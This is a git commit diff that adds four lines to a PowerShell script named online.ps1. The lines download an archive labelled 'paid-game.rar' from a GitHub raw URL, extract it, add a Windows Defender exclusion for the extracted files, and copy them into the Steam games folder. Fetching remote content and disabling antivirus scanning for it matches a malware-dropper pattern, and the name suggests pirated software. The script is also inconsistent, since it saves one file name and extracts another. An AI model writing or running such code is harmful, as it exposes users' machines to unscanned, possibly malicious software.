d226d762f0aefb4fd767f38d0e3b884775ab943a
pengux180 <pengux180@gmail.com>
2026-09-13 21:05:45 +0100

    Update online.ps1

--- online.ps1
+++ online.ps1
@@ -1,1 +1,4 @@
-
+wget -O ~/Downloads/paid-game.rar "https://raw.githubusercontent.com/pengux180/games/main/online.rar"
+& "C:\Program Files\7-Zip\7z.exe" x "$env:USERPROFILE\Downloads\online.rar" -o"$env:USERPROFILE\Downloads\online" -y
+Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads\online\*"
+copy "$env:USERPROFILE\Downloads\online\*" "C:\Program Files (x86)\Steam\steamapps\common\"
